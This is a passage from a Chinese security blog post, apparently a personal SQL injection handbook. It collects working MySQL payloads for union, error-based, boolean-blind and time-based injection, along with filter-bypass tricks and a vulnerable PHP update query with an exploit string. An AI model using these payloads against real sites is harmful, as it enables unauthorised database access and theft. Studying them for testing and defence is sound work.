@@ -1,0 +1,1541 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="N0rth3ty">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="N0rth3ty">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="每一顶白帽都有一道黑边">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <title>Sql注入手册 · N0rth3ty&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/img/a.jpg" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >N0rth3ty&#39;s Blog.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">Sql注入手册</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>N0rth3ty's Blog.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/img/02.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            Sql注入手册
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">3.5k</span>阅读时长: <span class="post-count reading-time">14 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/03/02</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <p>一直没有系统的总结sql注入<br>抽空写一个sql注入的笔记，也当作平时注入的手册<br>Mysql作为最常见的数据库，主要写Mysql，其它数据库主要写存在差异的地方<br>长期更新  </p>
+<h2 id="常见数据库搭配"><a href="#常见数据库搭配" class="headerlink" title="常见数据库搭配"></a>常见数据库搭配</h2><ul>
+<li>ASP + ACCESS + IIS</li>
+<li>ASP.NET + MSSQL +IIS  </li>
+<li>PHP + Mysql + Apache(Nginx)  </li>
+<li>JSP + Oracle(Mysql) + Tomcat  </li>
+</ul>
+<p>目前来讲就遇到过这些常见组合，快速判断数据库类型是注入的第一步  </p>
+<h2 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h2><h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><h4 id="数据库名"><a href="#数据库名" class="headerlink" title="数据库名"></a>数据库名</h4><ul>
+<li>database()</li>
+<li>schema()<h4 id="当前登陆用户"><a href="#当前登陆用户" class="headerlink" title="当前登陆用户"></a>当前登陆用户</h4></li>
+<li>USER()</li>
+<li>CURRENT_USER()</li>
+<li>SYSTEM_USER()</li>
+<li>SESSION_USER()<h4 id="数据库版本"><a href="#数据库版本" class="headerlink" title="数据库版本"></a>数据库版本</h4></li>
+<li>VERSION()</li>
+<li>@@VERSION</li>
+<li>@@GLOBAL.VERSION<h4 id="路径相关"><a href="#路径相关" class="headerlink" title="路径相关"></a>路径相关</h4></li>
+<li>@@BASEDIR : mysql安装路径</li>
+<li>@@SLAVE_LOAD_TMPDIR : 临时文件夹路径</li>
+<li>@@DATADIR : 数据存储路径</li>
+<li>@@CHARACTER_SETS_DIR : 字符集设置文件路径</li>
+<li>@@LOG_ERROR : 错误日志文件路径</li>
+<li>@@PID_FILE : pid-file文件路径</li>
+<li>@@BASEDIR : mysql安装路径</li>
+<li>@@SLAVE_LOAD_TMPDIR : 临时文件夹路径</li>
+</ul>
+<h4 id="字符串连接"><a href="#字符串连接" class="headerlink" title="字符串连接"></a>字符串连接</h4><ul>
+<li><p>concat(str1,str2) //将字符串首尾相连</p>
+</li>
+<li><p>concat_ws(separator,str1,str2) //将字符串用指定连接符连接</p>
+</li>
+<li><p>group_concat()//</p>
+</li>
+</ul>
+<h4 id="字符截断"><a href="#字符截断" class="headerlink" title="字符截断"></a>字符截断</h4><ul>
+<li><p>left(str,index)  //从左边第index开始截取</p>
+</li>
+<li><p>right(str,index) //从右边第index开始截取</p>
+</li>
+<li><p>substring(str,index) //从左边index开始截取</p>
+</li>
+<li><p>substr(str,index,len) //截取str,index开始,截取len的长度</p>
+</li>
+<li><p>mid(str,index,ken) //截取str 从index开始,截取len的长度</p>
+</li>
+</ul>
+<h4 id="字符串比较函数"><a href="#字符串比较函数" class="headerlink" title="字符串比较函数"></a>字符串比较函数</h4><ul>
+<li><p>strcmp(expr1,expr2)//如果两个字符串是一样则返回0,如果第一个小于第二个则返回-1</p>
+</li>
+<li><p>find_in_set(str,strlist) //如果相同则返回1不同则返回0</p>
+</li>
+</ul>
+<h4 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h4><ul>
+<li>--(后面还有个空格) </li>
+<li>#  单行注释符，url编码为%23  </li>
+<li>/*…*/  </li>
+<li>/<em>! 语句 </em>/ 语句会被执行  可用做分割    <h4 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h4>比较运算符</li>
+<li>=</li>
+<li>></li>
+<li>&lt;</li>
+<li>!=</li>
+<li>&lt;&gt; 不等于的意思</li>
+<li>like (模糊匹配 <code>select &#39;12345&#39; like &#39;12%&#39; =&gt; true</code>)  </li>
+<li>in（<code>select &#39;123&#39; in (&#39;12&#39;) =&gt; false</code>）</li>
+<li>between (<code>select database() between 0x61 and 0x7a;//select database() between &#39;a&#39; and &#39;z&#39;;</code>)  </li>
+<li>regexp / rlike(正则匹配<code>select &#39;123455&#39; regexp &#39;^12&#39; =&gt; true</code>)</li>
+</ul>
+<p>算术运算符  </p>
+<ul>
+<li>+</li>
+<li>-</li>
+<li>*</li>
+<li>/</li>
+</ul>
+<p>逻辑运算符  </p>
+<ul>
+<li>not / ！</li>
+<li>and / &amp;&amp;</li>
+<li>or / ||</li>
+<li>xor / ^ </li>
+</ul>
+<p>位运算符  </p>
+<ul>
+<li>&amp; 按位与</li>
+<li>| 按位或</li>
+<li>^ 按位异或</li>
+<li>! 取反</li>
+<li>&lt;&lt; 左移</li>
+<li>>>右移</li>
+</ul>
+<h4 id="绕过函数"><a href="#绕过函数" class="headerlink" title="绕过函数"></a>绕过函数</h4><ul>
+<li><p>instr(str1,substr) //从子字符串中返回子串第一次出现的位置</p>
+</li>
+<li><p>lpad(str,len,padstr) rpad(str,len,padstr) // 在str的左(右)两边填充给定的padstr到指定的长度len,返回填充的结果</p>
+</li>
+</ul>
+<h4 id="延时函数"><a href="#延时函数" class="headerlink" title="延时函数"></a>延时函数</h4><ul>
+<li>sleep()  </li>
+<li>benchmark(1000000,sha(1))</li>
+</ul>
+<h4 id="编码函数"><a href="#编码函数" class="headerlink" title="编码函数"></a>编码函数</h4><ul>
+<li>hex() </li>
+<li>ascii()</li>
+</ul>
+<h4 id="文件函数"><a href="#文件函数" class="headerlink" title="文件函数"></a>文件函数</h4><ul>
+<li>load_file() //读文件路径可以用0x，char转换的字符</li>
+<li>outfile <code>select * into outfile &#39;/tmp/test.txt&#39;</code></li>
+<li>dumpfile //用法同上但是只能写入一行数据，常用于udf提权写dll    </li>
+</ul>
+<h3 id="构造语句"><a href="#构造语句" class="headerlink" title="构造语句"></a>构造语句</h3><h4 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h4><ul>
+<li><code>if(expr1,expr2,expr3)</code> // expr1 true执行expr2否则执行expr3</li>
+<li><code>select case when (条件) then 代码1 else 代码 2 end</code>  </li>
+</ul>
+<h4 id="information-schema-结构"><a href="#information-schema-结构" class="headerlink" title="information_schema 结构"></a>information_schema 结构</h4><ul>
+<li>information_schema.tables:<br>查询表名:table_name  对应的数据库名: table_schema</li>
+<li>information_schema.columns:<br>查询列名:column_name 对应的表名:table_schemam  </li>
+</ul>
+<h4 id="Mysql注入语句一般形式"><a href="#Mysql注入语句一般形式" class="headerlink" title="Mysql注入语句一般形式"></a>Mysql注入语句一般形式</h4><ul>
+<li>联合 <code>构造联合语句 + 查询结果</code></li>
+<li>盲注 <code>查询结果 + 比较运算符 + 猜测值</code></li>
+<li>报错 <code>构造报错语句 + 查询结果</code></li>
+</ul>
+<h4 id="Mysql空白字符"><a href="#Mysql空白字符" class="headerlink" title="Mysql空白字符"></a>Mysql空白字符</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%20 %09 %0a %0b %0c %0d %a0 /**/ tab</span><br><span class="line">%a0 这个不会被php的\s进行匹配</span><br><span class="line">/*!*/ 内敛注释 #这个也可以用来做分隔</span><br></pre></td></tr></table></figure>
+<p>函数名和括号直接可以插入特殊字符 ex<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">concat/**/()</span><br><span class="line"></span><br><span class="line">information_schema/**/./**/TABLES</span><br><span class="line"></span><br><span class="line">information_schema%0a.%0aTABLES</span><br></pre></td></tr></table></figure></p>
+<h3 id="判断注入是否存在"><a href="#判断注入是否存在" class="headerlink" title="判断注入是否存在"></a>判断注入是否存在</h3><p>数值型注入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1+1</span><br><span class="line">?id=-1 or 1=1</span><br><span class="line">?id=-1 or 10-2=8</span><br><span class="line">?id=1 and 1=2</span><br><span class="line">?id=1 and 1=1</span><br></pre></td></tr></table></figure></p>
+<p>字符型注入<br>参数被引号包围，所以需要闭合引号<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;</span><br><span class="line">?id=1&quot;</span><br><span class="line">?id=1&apos; and &apos;1&apos;=&apos;1</span><br><span class="line">?id=1&quot; and &quot;1&quot;=&quot;1</span><br></pre></td></tr></table></figure></p>
+<p>闭合后构造语句再注释后面  </p>
+<h3 id="四大基本注入类型"><a href="#四大基本注入类型" class="headerlink" title="四大基本注入类型"></a>四大基本注入类型</h3><h4 id="UNION注入"><a href="#UNION注入" class="headerlink" title="UNION注入"></a>UNION注入</h4><p>最简单的注入</p>
+<p>用UNION SELECT注入时，若后面要注出的数据的列与原数据列数不同，则会失败。所以需要先猜解列数。  </p>
+<p><strong>ORDER BY</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ORDER BY 10 #</span><br><span class="line">ORDER BY 5  #</span><br><span class="line">ORDER BY 2  #</span><br></pre></td></tr></table></figure></p>
+<p>当ORDER BY的数字大于列数时会返回异常，反复测试，定位出正确的列数  </p>
+<p><strong>UNION SELECT</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UNION SELECT 1,2,3 #</span><br><span class="line">UNION ALL SELECT 1,2,3 #</span><br><span class="line">UNION ALL SELECT null,null,null #</span><br></pre></td></tr></table></figure></p>
+<p><strong>数据库查询</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT GROUP_CONCAT(SCHEMA_NAME) FROM information_schema.SCHEMATA</span><br><span class="line">SELECT DATABASE()  </span><br><span class="line">SELECT schema()</span><br></pre></td></tr></table></figure></p>
+<p><strong>表查询</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT GROUP_CONCAT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE()</span><br><span class="line">SELECT GROUP_CONCAT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=0xffffff</span><br></pre></td></tr></table></figure></p>
+<p><strong>字段查询</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT GROUP_CONCAT(column_name) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=0xffffff</span><br></pre></td></tr></table></figure></p>
+<p><strong>数据获取</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT GROUP_CONCAT(column_1,column_2) FROM databasename.tablename</span><br><span class="line">SELECT GROUP_CONCAT(column_1,column_2) FROM tablename  </span><br><span class="line">SELECT * FROM tablename</span><br></pre></td></tr></table></figure></p>
+<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p><strong>常见报错payload</strong></p>
+<ul>
+<li><p>floor()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select 1 from(select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>updatexml() //5.1.5</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and 1=(updatexml(1,concat(0x3a,(select user())),1))</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>extractvalue() //5.1.5</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and extractvalue(1,concat(0x5c,(select user())))</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>exp() //5.5.5版本之后可以使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select host from user where user = &apos;root&apos; and Exp(~(select * from (select version())a));</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>name_const //支持老版本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from (select NAME_CONST(version(),0),NAME_CONST(version(),0))x;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring() 几何函数报错  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select multipoint((select * from (select * from (select * from (select version())a)b)c));</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p><strong>常用payload</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; OR (SELECT ASCII(SUBSTR(DATABASE(),i,1) ) &lt; j) #</span><br></pre></td></tr></table></figure></p>
+<h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><p><strong>常用payload</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UNION SELECT IF(SUBSTR((SELECT GROUP_CONCAT(schema_name) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) &lt; j,BENCHMARK(100000,SHA1(1)),0)</span><br><span class="line">UNION SELECT IF(SUBSTR((SELECT GROUP_CONCAT(schema_name) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) &lt; j,SLEEP(10),0)</span><br></pre></td></tr></table></figure></p>
+<p>本质是if做判断然后是否执行sleep，再有回显的bool盲注中则不写延时语句，用0或者1代替    </p>
+<p>即查询结果有没有输出到页面是两者的本质区别，没有输出时才是时间盲注</p>
+<p>除开最常见的sleep延时，还有以下姿势  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select benchmark(10000000,sha(1));</span><br></pre></td></tr></table></figure>
+<p><strong>比赛姿势</strong>  </p>
+<ul>
+<li>笛卡尔积<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;</span><br><span class="line">+------------+</span><br><span class="line">| count(*)   |</span><br><span class="line">+------------+</span><br><span class="line">| 2651020120 |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (1 min 51.05 sec)</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>这种方法又叫做heavy query，可以通过选定一个大表来做笛卡儿积，但这种方式执行时间会几何倍数的提升，在站比较大的情况下会造成几何倍数的效果，实际利用起来非常不好用。  </p>
+<ul>
+<li>GET_LOCK</li>
+</ul>
+<p>是pwnhub的一道题目<br>利用场景是有条件限制的：需要提供长连接。在Apache+PHP搭建的环境中需要使用 mysql_pconnect函数来连接数据库。<br>太少用到不赘述了<br><a href="https://zhuanlan.zhihu.com/p/35245598" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/35245598</a>  </p>
+<ul>
+<li>RLIKE</li>
+</ul>
+<p>通过rpad或repeat构造长字符串，加以计算量大的pattern，通过repeat的参数可以控制延时长短。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select rpad(&apos;a&apos;,4999999,&apos;a&apos;) RLIKE concat(repeat(&apos;(a.*)+&apos;,30),&apos;b&apos;);</span><br><span class="line">+-------------------------------------------------------------+</span><br><span class="line">| rpad(&apos;a&apos;,4999999,&apos;a&apos;) RLIKE concat(repeat(&apos;(a.*)+&apos;,30),&apos;b&apos;) |</span><br><span class="line">+-------------------------------------------------------------+</span><br><span class="line">|                                                           0 |</span><br><span class="line">+-------------------------------------------------------------+</span><br><span class="line">1 row in set (5.27 sec)</span><br></pre></td></tr></table></figure></p>
+<h3 id="Mysql注入杂技"><a href="#Mysql注入杂技" class="headerlink" title="Mysql注入杂技"></a>Mysql注入杂技</h3><h4 id="insert-update-delete注入"><a href="#insert-update-delete注入" class="headerlink" title="insert/update/delete注入"></a>insert/update/delete注入</h4><p>这三类语句中可以报错注出数据，但我要写的是如何没有报错的情况下注出数据<br>本质是在闭合语句后通过子查询进行注入，通常为盲注  </p>
+<h5 id="update"><a href="#update" class="headerlink" title="update"></a>update</h5><p>一段我在实战中遇到的代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$result=mysql_query(<span class="string">"update ly set content='$content',hf_content='$hf_content',modi_date='$modi_date' where ly_id='$ly_id' "</span>);</span><br><span class="line"><span class="keyword">if</span>(mysql_affected_rows())</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&#123;\"success\":true,\"msg\":\"回复成功!\"&#125;"</span>;	</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&#123;\"success\":false,\"msg\":\"回复失败!\"&#125;"</span>;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>set 和 where 处都可以注入<br>建议在where处进行注入  </p>
+<p>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and sleep(1) %23</span><br></pre></td></tr></table></figure></p>
+<p>但是有不少的坑点，因为是根据mysql_affected_rows()判断来进行回显的，所以在update相同的值是并不会affected rows的，但是语句是可以执行的</p>
